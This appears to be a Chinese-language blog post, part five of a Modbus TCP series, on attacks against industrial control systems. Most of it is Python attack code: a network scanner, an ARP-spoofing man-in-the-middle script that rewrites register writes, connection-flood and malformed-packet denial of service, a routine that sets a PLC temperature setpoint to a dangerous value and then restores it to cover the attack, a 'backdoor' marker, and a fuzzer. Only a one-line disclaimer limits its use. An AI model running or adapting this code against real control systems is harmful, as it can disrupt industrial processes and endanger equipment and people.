---
title: "Modbus TCP 深度解析 (五)：安全威脅與攻擊手法分析"
date: 2025-07-05
categories: [工控資安]
tags: [modbus]
slug: "modbus-tcp-series-05-security-threats"
---

## 0x00 前情提要

在[前一集](/posts/modbus-tcp-series-04-error-handling/)中，我們學習了錯誤處理和診斷技術。今天我們要從資安的角度深入分析 Modbus TCP 的安全威脅，這對於保護工控系統至關重要。

**上集練習題答案：**

**練習 3：錯誤封包分析**

```
00 05 00 00 00 03 01 86 03

解析：
- Transaction ID: 0x0005
- 錯誤功能碼: 0x86 (0x06 + 0x80) = 寫入單個暫存器錯誤
- 異常碼: 0x03 = Illegal Data Value
- 問題：嘗試寫入的數值超出允許範圍
```

## 0x01 Modbus TCP 安全弱點分析

### 協議層面的安全缺陷

Modbus TCP 協議設計於工業環境安全性要求較低的年代，存在以下根本性安全問題：

```
┌─────────────────────────────────────────────────────────┐
│                  Modbus TCP 安全弱點                      │
├─────────────────┬───────────────────────────────────────┤
│ 認證機制        │ ❌ 無內建身份驗證                        │
│ 加密保護        │ ❌ 明文傳輸，無加密機制                  │
│ 授權控制        │ ❌ 無存取權限控制                        │
│ 完整性檢查      │ ❌ 無資料完整性驗證                      │
│ 防重放攻擊      │ ❌ 無時間戳或序號保護                    │
│ 會話管理        │ ❌ 無安全會話機制                        │
└─────────────────┴───────────────────────────────────────┘
```

### 攻擊面分析

```
網路層 ←→ TCP 層 ←→ Modbus 應用層 ←→ 設備層
   ↓        ↓           ↓            ↓
網路掃描   連線洪水    協議攻擊      設備控制
ARP 偽造   TCP 劫持    功能碼濫用    參數篡改
         連線注入    資料注入      韌體攻擊
```

## 0x02 網路層攻擊技術

### 網路探測與指紋識別

攻擊者首先會進行網路偵察，識別 Modbus 設備：

```python
import socket
import struct
import threading
from concurrent.futures import ThreadPoolExecutor

class ModbusScanner:
    def __init__(self):
        self.discovered_devices = []
        self.timeout = 3

    def scan_single_ip(self, ip):
        """掃描單一 IP 的 Modbus 服務"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            # 嘗試連線到 502 埠
            result = sock.connect_ex((ip, 502))

            if result == 0:
                # 發送簡單的 Modbus 請求探測
                device_info = self.probe_modbus_device(sock, ip)
                if device_info:
                    self.discovered_devices.append(device_info)

            sock.close()

        except Exception as e:
            pass  # 忽略錯誤，繼續掃描

    def probe_modbus_device(self, sock, ip):
        """探測 Modbus 設備資訊"""
        try:
            # 構建設備識別請求 (功能碼 0x2B)
            # MEI Type 0x0E: Read Device Identification
            request = struct.pack('>HHHBBBBBB',
                1,      # Transaction ID
                0,      # Protocol ID
                5,      # Length
                1,      # Unit ID
                0x2B,   # Function Code
                0x0E,   # MEI Type
                0x01,   # Read Device ID Code
                0x00    # Object ID (Vendor Name)
            )

            sock.send(request)
            response = sock.recv(1024)

            if len(response) > 8:
                device_info = {
                    'ip': ip,
                    'port': 502,
                    'responding': True,
                    'details': self.parse_device_identification(response)
                }
                return device_info
            else:
                # 即使沒有設備識別回應，仍然是 Modbus 設備
                return {
                    'ip': ip,
                    'port': 502,
                    'responding': True,
                    'details': {}
                }

        except Exception:
            return None

    def parse_device_identification(self, response):
        """解析設備識別回應"""
        try:
            if len(response) < 10:
                return {}

            # 跳過 MBAP Header 和功能碼
            data = response[8:]

            if len(data) < 4:
                return {}

            mei_type = data[0]
            read_code = data[1]
            conformity = data[2]

            # 解析物件清單
            objects = {}
            offset = 6  # 跳到物件資料

            while offset < len(data):
                if offset + 2 > len(data):
                    break

                obj_id = data[offset]
                obj_len = data[offset + 1]
                offset += 2

                if offset + obj_len > len(data):
                    break

                obj_value = data[offset:offset + obj_len].decode('ascii', errors='ignore')
                objects[obj_id] = obj_value
                offset += obj_len

            return {
                'vendor_name': objects.get(0x00, 'Unknown'),
                'product_code': objects.get(0x01, 'Unknown'),
                'major_minor_version': objects.get(0x02, 'Unknown')
            }

        except Exception:
            return {}

    def scan_network(self, network_range):
        """掃描整個網路範圍"""
        print(f"正在掃描網路範圍: {network_range}")

        # 解析網路範圍 (例如: "192.168.1.1-254")
        if '-' in network_range:
            base_ip, range_part = network_range.rsplit('.', 1)
            start, end = map(int, range_part.split('-'))

            ips = [f"{base_ip}.{i}" for i in range(start, end + 1)]
        else:
            # 單一 IP
            ips = [network_range]

        # 多執行緒掃描
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(self.scan_single_ip, ips)

        return self.discovered_devices

# 使用範例
def network_reconnaissance():
    scanner = ModbusScanner()

    # 掃描常見的工控網路範圍
    target_networks = [
        "192.168.1.1-254",
        "10.0.0.1-254",
        "172.16.0.1-254"
    ]

    all_devices = []
    for network in target_networks:
        devices = scanner.scan_network(network)
        all_devices.extend(devices)

    # 輸出發現的設備
    print(f"\n發現 {len(all_devices)} 個 Modbus 設備:")
    for device in all_devices:
        print(f"IP: {device['ip']}")
        if device['details']:
            for key, value in device['details'].items():
                print(f"  {key}: {value}")
        print()

    return all_devices

# 進階指紋識別
def advanced_fingerprinting(ip):
    """進階設備指紋識別"""
    fingerprint_tests = [
        # 測試 1: 檢查支援的功能碼
        {
            'name': 'Function Code Support',
            'test': lambda client: test_function_codes(client),
        },
        # 測試 2: 記憶體佈局探測
        {
            'name': 'Memory Layout',
            'test': lambda client: probe_memory_layout(client),
        },
        # 測試 3: 錯誤回應模式
        {
            'name': 'Error Response Pattern',
            'test': lambda client: analyze_error_patterns(client),
        }
    ]

    results = {}
    client = ModbusTCPClient(ip)

    try:
        client.connect()

        for test in fingerprint_tests:
            try:
                results[test['name']] = test['test'](client)
            except Exception as e:
                results[test['name']] = f"測試失敗: {e}"

    finally:
        client.close()

    return results

def test_function_codes(client):
    """測試支援的功能碼"""
    function_codes = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x0F, 0x10, 0x2B]
    supported = []

    for fc in function_codes:
        try:
            # 發送最小的測試請求
            if fc == 0x03:  # Read Holding Registers
                client.read_holding_registers(0, 1)
                supported.append(f"0x{fc:02X}")
        except ModbusException as e:
            if e.exception_code != 0x01:  # 不是 Illegal Function
                supported.append(f"0x{fc:02X}")
        except Exception:
            pass

    return supported
```

### 中間人攻擊 (Man-in-the-Middle)

```python
import scapy.all as scapy
from scapy.layers.inet import IP, TCP

class ModbusMITM:
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.intercepted_packets = []

    def arp_spoof(self, target_ip, spoof_ip):
        """ARP 欺騙攻擊"""
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)

    def get_mac(self, ip):
        """取得 MAC 地址"""
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def packet_callback(self, packet):
        """封包攔截回調函數"""
        if packet.haslayer(TCP) and packet[TCP].dport == 502:
            # 攔截到 Modbus TCP 封包
            self.intercepted_packets.append(packet)
            self.analyze_and_modify_packet(packet)

    def analyze_and_modify_packet(self, packet):
        """分析並修改封包"""
        try:
            tcp_payload = bytes(packet[TCP].payload)

            if len(tcp_payload) >= 8:  # 最小 Modbus TCP 封包
                # 解析 MBAP Header
                tid, pid, length, uid = struct.unpack('>HHHB', tcp_payload[:7])
                function_code = tcp_payload[7]

                print(f"攔截 Modbus 封包:")
                print(f"  Transaction ID: {tid}")
                print(f"  功能碼: 0x{function_code:02X}")

                # 修改封包的範例
                if function_code == 0x06:  # Write Single Register
                    if len(tcp_payload) >= 12:
                        address, value = struct.unpack('>HH', tcp_payload[8:12])
                        print(f"  寫入地址: {address}, 數值: {value}")

                        # 惡意修改：將所有寫入數值改為 0
                        modified_payload = tcp_payload[:10] + struct.pack('>H', 0)
                        packet[TCP].payload = modified_payload
                        print(f"  *** 已修改數值為 0 ***")

        except Exception as e:
            print(f"封包分析錯誤: {e}")

    def start_attack(self):
        """開始中間人攻擊"""
        print(f"開始 ARP 欺騙攻擊: {self.target_ip}")

        # 啟動 ARP 欺騙
        import threading

        def arp_spoof_thread():
            while True:
                self.arp_spoof(self.target_ip, self.gateway_ip)
                self.arp_spoof(self.gateway_ip, self.target_ip)
                time.sleep(2)

        spoof_thread = threading.Thread(target=arp_spoof_thread)
        spoof_thread.daemon = True
        spoof_thread.start()

        # 開始封包捕獲
        print("開始監聽封包...")
        scapy.sniff(iface=self.interface, prn=self.packet_callback,
                   filter="tcp port 502", store=False)
```

## 0x03 應用層攻擊技術

### 功能碼濫用攻擊

```python
class ModbusAttacker:
    def __init__(self, target_ip, target_port=502):
        self.target_ip = target_ip
        self.target_port = target_port
        self.client = None

    def connect(self):
        """建立攻擊連線"""
        self.client = ModbusTCPClient(self.target_ip, self.target_port)
        self.client.connect()

    def reconnaissance_attack(self):
        """偵察攻擊 - 收集系統資訊"""
        print("正在執行偵察攻擊...")

        recon_results = {
            'device_info': {},
            'memory_map': {},
            'supported_functions': [],
            'error_patterns': {}
        }

        # 1. 設備識別
        try:
            device_info = self.device_identification()
            recon_results['device_info'] = device_info
            print(f"設備資訊: {device_info}")
        except Exception as e:
            print(f"設備識別失敗: {e}")

        # 2. 記憶體映射探測
        memory_map = self.probe_memory_ranges()
        recon_results['memory_map'] = memory_map

        # 3. 功能碼探測
        supported_funcs = self.probe_function_codes()
        recon_results['supported_functions'] = supported_funcs

        return recon_results

    def device_identification(self):
        """設備識別攻擊"""
        try:
            # MEI Type 0x0E: Read Device Identification
            request = struct.pack('>HHHBBBBBB',
                1, 0, 5, 1, 0x2B, 0x0E, 0x01, 0x00, 0x00
            )

            self.client.sock.send(request)
            response = self.client.sock.recv(1024)

            return self.parse_device_info(response)

        except Exception as e:
            return {"error": str(e)}

    def probe_memory_ranges(self):
        """記憶體範圍探測"""
        print("探測記憶體佈局...")

        memory_ranges = {
            'holding_registers': [],
            'input_registers': [],
            'coils': [],
            'discrete_inputs': []
        }

        # 探測保持暫存器
        for base_addr in range(0, 10000, 100):
            try:
                result = self.client.read_holding_registers(base_addr, 1)
                memory_ranges['holding_registers'].append({
                    'address': base_addr,
                    'accessible': True,
                    'value': result[0] if result else None
                })
                print(f"發現保持暫存器: {base_addr}")

            except ModbusException as e:
                if e.exception_code == 0x02:  # Illegal Data Address
                    continue
                memory_ranges['holding_registers'].append({
                    'address': base_addr,
                    'accessible': False,
                    'error': e.exception_code
                })
            except Exception:
                break

        return memory_ranges

    def denial_of_service_attack(self):
        """拒絕服務攻擊"""
        print("執行拒絕服務攻擊...")

        attack_methods = [
            self.connection_flood,
            self.malformed_packets,
            self.resource_exhaustion
        ]

        for method in attack_methods:
            try:
                print(f"嘗試攻擊方法: {method.__name__}")
                method()
            except Exception as e:
                print(f"攻擊方法 {method.__name__} 失敗: {e}")

    def connection_flood(self):
        """連線洪水攻擊"""
        connections = []

        try:
            for i in range(100):  # 建立大量連線
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                connections.append(sock)

                if i % 10 == 0:
                    print(f"已建立 {i+1} 個連線")

            print("連線洪水攻擊執行中，保持連線...")
            time.sleep(30)  # 保持連線 30 秒

        finally:
            # 清理連線
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass

    def malformed_packets(self):
        """畸形封包攻擊"""
        malformed_packets = [
            # 超長 Transaction ID
            b'\xFF' * 1000 + b'\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01',

            # 無效 Length 欄位
            b'\x00\x01\x00\x00\xFF\xFF\x01\x03\x00\x00\x00\x01',

            # 畸形功能碼
            b'\x00\x01\x00\x00\x00\x06\x01\xFF\x00\x00\x00\x01',

            # 空封包
            b'',

            # 超大封包
            b'\x00\x01\x00\x00\x01\x00' + b'\x01' * 256 + b'\x03' + b'\x00' * 250
        ]

        for i, packet in enumerate(malformed_packets):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                sock.send(packet)

                print(f"發送畸形封包 {i+1}")

                # 嘗試接收回應
                try:
                    response = sock.recv(1024)
                    print(f"  收到回應: {len(response)} bytes")
                except socket.timeout:
                    print("  無回應 (可能造成掛起)")

                sock.close()
                time.sleep(0.1)

            except Exception as e:
                print(f"  畸形封包 {i+1} 錯誤: {e}")

    def data_manipulation_attack(self):
        """資料操縱攻擊"""
        print("執行資料操縱攻擊...")

        # 攻擊場景：修改溫度設定點
        try:
            # 1. 讀取原始設定點
            original_temp = self.client.read_holding_registers(40001, 1)[0]
            print(f"原始溫度設定: {original_temp}")

            # 2. 惡意修改為危險值
            dangerous_temp = 9999  # 假設這是危險的高溫
            self.client.write_single_register(40001, dangerous_temp)
            print(f"已修改溫度設定為: {dangerous_temp}")

            # 3. 驗證修改
            new_temp = self.client.read_holding_registers(40001, 1)[0]
            print(f"確認新設定: {new_temp}")

            # 4. (可選) 恢復原始值以掩蓋攻擊
            time.sleep(5)  # 讓危險設定生效一段時間
            self.client.write_single_register(40001, original_temp)
            print(f"已恢復原始設定: {original_temp}")

        except Exception as e:
            print(f"資料操縱攻擊失敗: {e}")

    def persistent_backdoor(self):
        """植入持久性後門"""
        print("嘗試植入後門...")

        try:
            # 利用診斷功能植入後門
            # 這裡是概念性示範，實際後門會更複雜

            # 1. 檢查是否已有後門
            backdoor_check = self.client.read_holding_registers(49999, 1)[0]

            if backdoor_check == 0xDEAD:
                print("後門已存在")
                return True

            # 2. 植入後門標記
            self.client.write_single_register(49999, 0xDEAD)

            # 3. 設定後門觸發條件
            # 當特定暫存器被設為特定值時，執行後門功能
            self.client.write_single_register(49998, 0xBEEF)

            print("後門植入成功")
            return True

        except Exception as e:
            print(f"後門植入失敗: {e}")
            return False

# 攻擊執行範例
def execute_attack_scenario():
    """執行完整攻擊場景"""
    target_ip = "192.168.1.100"  # 目標 PLC IP

    attacker = ModbusAttacker(target_ip)

    try:
        attacker.connect()
        print(f"已連線到目標: {target_ip}")

        # 階段 1: 偵察
        print("\n=== 階段 1: 偵察 ===")
        recon_data = attacker.reconnaissance_attack()

        # 階段 2: 漏洞利用
        print("\n=== 階段 2: 漏洞利用 ===")
        attacker.data_manipulation_attack()

        # 階段 3: 持久性
        print("\n=== 階段 3: 持久性 ===")
        attacker.persistent_backdoor()

        # 階段 4: 拒絕服務 (可選)
        print("\n=== 階段 4: 拒絕服務 ===")
        # attacker.denial_of_service_attack()  # 謹慎使用

    except Exception as e:
        print(f"攻擊執行錯誤: {e}")

    finally:
        if attacker.client:
            attacker.client.close()
```

## 0x04 模糊測試 (Fuzzing) 技術

```python
import random
import itertools

class ModbusFuzzer:
    def __init__(self, target_ip, target_port=502):
        self.target_ip = target_ip
        self.target_port = target_port
        self.crashes_found = []
        self.anomalies_found = []

    def generate_fuzz_packets(self):
        """產生模糊測試封包"""
        fuzz_packets = []

        # 1. MBAP Header 模糊測試
        for tid in [0x0000, 0xFFFF, 0x8000]:
            for pid in [0x0000, 0xFFFF, 0x0001]:
                for length in [0x0000, 0x0001, 0x00FF, 0xFFFF]:
                    for uid in [0x00, 0x01, 0xFF]:
                        mbap = struct.pack('>HHHB', tid, pid, length, uid)
                        fuzz_packets.append(mbap)

        # 2. 功能碼模糊測試
        function_codes = list(range(256))  # 0x00 - 0xFF

        # 3. 資料欄位模糊測試
        data_patterns = [
            b'',  # 空資料
            b'\x00',  # 單一零位元組
            b'\xFF',  # 單一 0xFF
            b'\x00' * 100,  # 大量零
            b'\xFF' * 100,  # 大量 0xFF
            b'\xAA' * 50,   # 交替模式
            b'\x55' * 50,   # 另一個交替模式
            os.urandom(50),  # 隨機資料
        ]

        return fuzz_packets, function_codes, data_patterns

    def fuzz_test_single_packet(self, packet):
        """測試單一模糊封包"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))

            start_time = time.time()
            sock.send(packet)

            try:
                response = sock.recv(1024)
                response_time = time.time() - start_time

                # 分析回應
                result = {
                    'packet': packet.hex(),
                    'response': response.hex() if response else None,
                    'response_time': response_time,
                    'status': 'normal'
                }

                # 檢測異常
                if response_time > 2.0:  # 回應時間過長
                    result['status'] = 'slow_response'
                    self.anomalies_found.append(result)

                if len(response) == 0:  # 無回應
                    result['status'] = 'no_response'
                    self.anomalies_found.append(result)

                return result

            except socket.timeout:
                result = {
                    'packet': packet.hex(),
                    'response': None,
                    'status': 'timeout',
                    'response_time': 5.0
                }
                self.anomalies_found.append(result)
                return result

        except ConnectionRefusedError:
            # 可能的崩潰指標
            result = {
                'packet': packet.hex(),
                'status': 'connection_refused'
            }
            self.crashes_found.append(result)
            return result

        except Exception as e:
            result = {
                'packet': packet.hex(),
                'status': 'error',
                'error': str(e)
            }
            return result

        finally:
            try:
                sock.close()
            except:
                pass

    def comprehensive_fuzz_test(self):
        """全面模糊測試"""
        print("開始全面模糊測試...")

        fuzz_packets, function_codes, data_patterns = self.generate_fuzz_packets()

        test_count = 0

        # 測試所有組合
        for mbap in fuzz_packets[:10]:  # 限制 MBAP 變化
            for fc in function_codes[:20]:  # 限制功能碼
                for data in data_patterns[:5]:  # 限制資料模式

                    # 構建完整封包
                    packet = mbap + struct.pack('B', fc) + data

                    result = self.fuzz_test_single_packet(packet)
                    test_count += 1

                    if test_count % 100 == 0:
                        print(f"已測試 {test_count} 個封包...")

                    # 檢查是否發現嚴重問題
                    if result['status'] in ['connection_refused', 'timeout']:
                        print(f"發現潛在問題: {result['status']}")
                        print(f"問題封包: {result['packet']}")

        # 輸出測試結果
        self.report_fuzz_results()

    def report_fuzz_results(self):
        """報告模糊測試結果"""
        print("\n=== 模糊測試結果 ===")
        print(f"發現崩潰: {len(self.crashes_found)}")
        print(f"發現異常: {len(self.anomalies_found)}")

        if self.crashes_found:
            print("\n崩潰封包:")
            for crash in self.crashes_found[:5]:  # 只顯示前 5 個
                print(f"  {crash['packet']}")

        if self.anomalies_found:
            print("\n異常回應:")
            for anomaly in self.anomalies_found[:5]:
                print(f"  狀態: {anomaly['status']}")
                print(f"  封包: {anomaly['packet']}")

# 專門的漏洞挖掘
def vulnerability_discovery():
    """漏洞挖掘程序"""
    target_ip = "192.168.1.100"

    # 1. 基本模糊測試
    fuzzer = ModbusFuzzer(target_ip)
    fuzzer.comprehensive_fuzz_test()

    # 2. 特定協議欄位測試
    specific_tests = [
        test_transaction_id_overflow,
        test_length_field_manipulation,
        test_unit_id_boundary,
        test_function_code_edge_cases
    ]

    for test in specific_tests:
        try:
            test(target_ip)
        except Exception as e:
            print(f"測試 {test.__name__} 失敗: {e}")

def test_transaction_id_overflow(target_ip):
    """測試 Transaction ID 溢位"""
    print("測試 Transaction ID 溢位...")

    client = ModbusTCPClient(target_ip)
    client.connect()

    try:
        # 測試邊界值
        boundary_values = [0, 1, 32767, 32768, 65535, 65536]

        for tid in boundary_values:
            # 手動構建封包以控制 Transaction ID
            packet = struct.pack('>HHHBBHH',
                tid & 0xFFFF,  # Transaction ID (截斷到 16 位)
                0,             # Protocol ID
                6,             # Length
                1,             # Unit ID
                3,             # Function Code
                0,             # Address
                1              # Quantity
            )

            client.sock.send(packet)
            response = client.sock.recv(1024)

            print(f"Transaction ID {tid}: 正常回應")

    except Exception as e:
        print(f"Transaction ID 測試發現異常: {e}")

    finally:
        client.close()
```

## 0x05 下集預告

在最後一集《防護策略與最佳實務》中，我們將學習：

- 網路層防護措施
- 應用層安全加固
- 監控和檢測技術
- 事件回應和恢復策略

## 0x06 實作練習

**練習 1：** 實作一個 Modbus 蜜罐，記錄攻擊者的行為模式。

**練習 2：** 設計一個攻擊檢測系統，能識別異常的 Modbus 流量。

**練習 3：** 分析實際的 Modbus 攻擊流量，識別攻擊技術。

**⚠️ 安全提醒：** 本文內容僅供教育和研究目的，請勿用於未經授權的系統。

---

_本文為 Modbus TCP 深度解析系列第五篇，下集將完成防護策略的完整指南！_
